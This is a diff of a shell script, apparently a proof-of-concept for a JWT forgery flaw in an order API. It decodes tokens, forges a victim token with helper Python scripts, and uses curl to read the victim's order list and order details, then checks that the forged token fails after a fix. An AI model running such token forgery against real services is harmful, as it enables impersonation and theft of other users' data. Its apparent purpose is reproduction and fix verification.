@@ -1,18 +1,38 @@
-# Set variables
 export API="YOUR_API_URL"
 export TOKEN_B="ATTACKER_TOKEN"
 export TOKEN_C="VICTIM_TOKEN"
 
-# Test normal behavior
+# Confirm normal behavior
 curl -s "$API" \
 -H "content-type: application/json" \
 -H "authorization: $TOKEN_B" \
 --data-raw '{"action":"orders"}' | jq
 
-# Forge token (result stored manually)
-export FAKE_AS_C="FORGED_TOKEN"
+# Decode tokens
+python3 jwt_decode.py
 
-# Exploit
+# Set victim username
+export VICTIM_USER="VICTIM_USERNAME"
+
+# Forge token
+export FAKE_AS_C="$(python3 jwt_forge.py)"
+
+# Access victim order list
+curl -s "$API" \
+-H "content-type: application/json" \
+-H "authorization: $FAKE_AS_C" \
+--data-raw '{"action":"orders"}' | jq
+
+# Set victim order ID
+export ORDER_C="9174c1b7-7c55-40d0-957d-5f9cc2897109"
+
+# Access full victim order details
+curl -s "$API" \
+-H "content-type: application/json" \
+-H "authorization: $FAKE_AS_C" \
+--data-raw "{\"action\":\"get\",\"order-id\":\"$ORDER_C\"}" | jq
+
+# After fix: forged token should fail
 curl -s "$API" \
 -H "content-type: application/json" \
 -H "authorization: $FAKE_AS_C" \
